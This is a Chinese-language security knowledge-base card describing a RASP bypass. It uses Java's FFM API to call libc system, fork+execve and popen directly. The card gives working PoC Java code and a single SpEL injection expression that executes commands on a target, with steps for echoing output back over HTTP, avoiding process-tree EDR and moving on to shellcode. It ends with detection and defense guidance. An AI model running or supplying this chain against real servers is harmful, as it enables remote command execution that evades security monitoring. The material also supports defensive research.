---
id: web-java-rce-ffm-native-system-rasp-bypass
title: Java FFM API 直调 libc system/fork+execve：绕过 Runtime/ProcessBuilder 的 RASP 命令执行拦截
type: scenario
domain: web
path: web/java/rce
technique: java-ffm-native-exec-rasp-bypass
tags:
- java
- ffi
- foreign-function-memory
- rasp
- bypass
- command-execution
- spel
- jdk21
- native
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: JDK 21（FFM API 为 Preview，需 --enable-preview）；JDK 22+ 转正但受 --enable-native-access 控制
verification:
  verified_by: verifier-V63
  verified_at: '2026-11-05T11:54:37+08:00'
  notes: 已对照原文核对：FFM 调用流程、system/fork+execve、strace 对比、SimpleRasp 拦截 Runtime/ProcessBuilder 而 FFM 通过、SpEL 单表达式与 popen 回显均与截图一致。已修正失效关联链接 [[web-java-expression-spel]] 为实际存在的 [[web-java-expression-spel-injection-to-rce]]。未验证点：popen 回显只在独立 Java 程序验证，未端到端经 SpEL 触发；文中正文写 JDK 21.0.2+13，截图 javac 为 21.0.11-ea，属环境记录不一致。
url: /docs/web/java/rce/web-java-rce-ffm-native-system-rasp-bypass/
draft: false
kb_aliases:
- FFM API RASP 绕过
- java.lang.foreign 命令执行
- Linker.nativeLinker
- downcallHandle system
- fork execve 绕过 RASP
- SpEL FFM 利用链
---

## 一句话结论

JDK 21 的 Foreign Function & Memory（FFM）API 允许纯 Java 代码通过 `Linker.nativeLinker().downcallHandle()` 直接调用 libc 的 `system()` 或 `fork()+execve()`，整条路径不经过 `java.lang.Runtime`、`ProcessBuilder`、`ProcessImpl`，因此只 Hook 这些类的 RASP 和 `SecurityManager.checkExec()` 完全看不到命令执行；在 SpEL 等表达式注入点中可单条表达式构造该链，配合 `popen()+fgets()` 还能把命令输出带回 HTTP 响应。

## 原理

- FFM API（`java.lang.foreign`）的核心组件：`Linker`（Java↔Native 桥梁）、`SymbolLookup`（在已加载库中查符号，本质 `dlsym(RTLD_DEFAULT, ...)`）、`FunctionDescriptor`（描述 C 函数签名）、`MemorySegment`（堆外内存）、`Arena`（生命周期）、`ValueLayout`（类型布局）。
- 调用流程：`Linker.nativeLinker()` → `defaultLookup().find("system")` → `downcallHandle(addr, descriptor)` 得到 `MethodHandle` → `Arena` 分配 C 字符串 → `invoke()`。底层路径为 `downcallHandle → JVM adapter stub → libffi → libc system()`，JVM 只看到一次 `MethodHandle.invoke()`。
- RASP 的命令执行防护通常 Hook `Runtime.exec()`、`ProcessBuilder.start()`、`ProcessImpl.forkAndExec()`，或在 `SecurityManager.checkExec()` 上拦截。FFM 调用不经过这些 Java 类，也不触发 `checkExec`，因此这些 Hook 全部失效。
- `system()` 内部通过 `/bin/sh -c` 执行命令，进程树中会出现 `sh`，可能被 EDR 捕获；直接调用 `fork()+execve()` 可避免中间 shell，进程链更短、更可控。
- SpEL 支持 `T()` 引用类型和链式调用，可把整条 FFM 链写成一个表达式：`T(Linker).nativeLinker().downcallHandle(T(Linker).nativeLinker().defaultLookup().find('system').get(), T(FunctionDescriptor).of(...)).invokeWithArguments(T(Arena).ofAuto().allocateUtf8String('id'))`。
- `system()` 的输出默认写到 JVM 进程 stdout，HTTP 响应只拿到返回值；用 `popen()+fgets()+pclose()` 可以把命令输出读回 Java 字符串，实现回显。
- 为什么成立：安全边界建在“Java API 层”，而 FFM 把调用下沉到 native 层；语言层 Hook 无法覆盖未经过这些类的 native 调用。真正的行为特征是底层的 `execve`/`clone` 系统调用。

## 触发条件

- 目标 JVM 为 JDK 21 且以 `--enable-preview` 运行（或 JDK 22+ 且允许目标模块 native access）；
- 存在可执行任意 Java/SpEL 的注入点（SpEL 表达式注入、模板、脚本引擎等）；
- RASP 只覆盖 `Runtime`/`ProcessBuilder`/`ProcessImpl`/`SecurityManager.checkExec`，未 Hook FFM；
- 目标为 Linux/glibc，`system`、`fork`、`execve`、`popen` 等符号可用；
- 攻击者能观测命令副作用或通过 `popen` 回显。

## 利用步骤

1. 确认注入点可执行 SpEL（如 `1+1` 返回 2）。
2. 构造 FFM 链：获取 Linker → 查找 `system` 符号 → 创建 `downcallHandle` → 分配命令字符串 → `invoke`。
3. 若需要无 shell 的进程链，改用 `fork()+execve()+waitpid()`。
4. 若需要回显，改用 `popen()+fgets()+pclose()`，把输出拼进表达式返回值。
5. 对 payload 做 URL 编码后通过 HTTP 发送；`system()` 输出在服务端 stdout，`popen` 输出在 HTTP 响应。
6. 若 RASP 后续补上 FFM Hook，转向 `mmap` RWX + Shellcode 的进程内执行（见关联卡）。

## PoC

```java
// 最小 FFM 调用 libc system()
import java.lang.foreign.*;
import java.lang.invoke.MethodHandle;

Linker linker = Linker.nativeLinker();
MemorySegment systemAddr = linker.defaultLookup().find("system").orElseThrow();
MethodHandle systemHandle = linker.downcallHandle(
    systemAddr,
    FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
try (Arena arena = Arena.ofConfined()) {
    MemorySegment cmd = arena.allocateUtf8String("id && whoami");
    int rc = (int) systemHandle.invoke(cmd);
}
```

```text
# SpEL 单表达式（URL 编码前）
T(java.lang.foreign.Linker).nativeLinker().downcallHandle(
  T(java.lang.foreign.Linker).nativeLinker().defaultLookup().find('system').get(),
  T(java.lang.foreign.FunctionDescriptor).of(
    T(java.lang.foreign.ValueLayout).JAVA_INT,
    T(java.lang.foreign.ValueLayout).ADDRESS))
.invokeWithArguments(
  T(java.lang.foreign.Arena).ofAuto().allocateUtf8String('id'))
```

```java
// popen + fgets 回显
MethodHandle popen = linker.downcallHandle(lookup.find("popen").orElseThrow(),
    FunctionDescriptor.of(ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS));
MethodHandle fgets = linker.downcallHandle(lookup.find("fgets").orElseThrow(),
    FunctionDescriptor.of(ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
MethodHandle pclose = linker.downcallHandle(lookup.find("pclose").orElseThrow(),
    FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
```

## 变体与关联

- 变体：`fork()+execve()+waitpid()` 避免 `/bin/sh` 中间进程，适合规避基于进程树的 EDR 规则。
- 变体：`popen()+fgets()` 实现 HTTP 回显；也可把输出写入文件/通过 DNS 外带。
- 变体：FFM 还可调用 `mmap()` 分配 RWX 内存并执行 Shellcode，完全不产生子进程（见关联卡）。
- 关联：[[web-java-rce-ffm-mmap-shellcode-inprocess]]（FFM + Shellcode 进程内执行，规避进程创建监控）。
- 关联：[[web-java-rce-processimpl-constructor-reflect-exec]]（传统 Runtime/ProcessImpl 反射命令执行；本卡是绕过其 RASP Hook 的 native 路径）。
- 关联：[[web-java-expression-spel-injection-to-rce]]（SpEL 注入入口；本卡提供 FFM 利用链）。
- 影响边界：JDK 21 未启用 `--enable-preview`、JDK 22+ 使用 `--illegal-native-access=deny` 且模块未授权、RASP 已 Hook FFM、目标非 Linux/glibc 时，本链失效或需调整。

## 检测与防御

- 检测：RASP 增加 Hook：`Linker.nativeLinker()`、`SymbolLookup.find(String)`、`Linker.downcallHandle()`、`SymbolLookup.libraryLookup()`；对 `system`、`execve`、`popen`、`mmap`、`dlopen`、`mprotect` 等符号查找告警/阻断。
- 检测：WAF 增加 `nativeLinker`、`downcallHandle`、`SymbolLookup`、`java.lang.foreign`、`FunctionDescriptor`、`ValueLayout.ADDRESS` 等关键字规则；对 SpEL 表达式做解码后的语义检测。
- 检测：eBPF/审计监控 `execve` 的父进程为 java 且调用栈不经过常规进程创建路径；监控 `mmap`/`mprotect` 的 PROT_EXEC 分配。
- 防御：JDK 21 生产环境不要启用 `--enable-preview`；JDK 22+ 使用 `--enable-native-access=<模块>` 白名单并配合 `--illegal-native-access=deny`。
- 防御：不要只依赖 Java 层 RASP；把行为监控下沉到内核（eBPF）、容器 seccomp、只读文件系统和最小权限，检测底层系统调用而非上层 API。
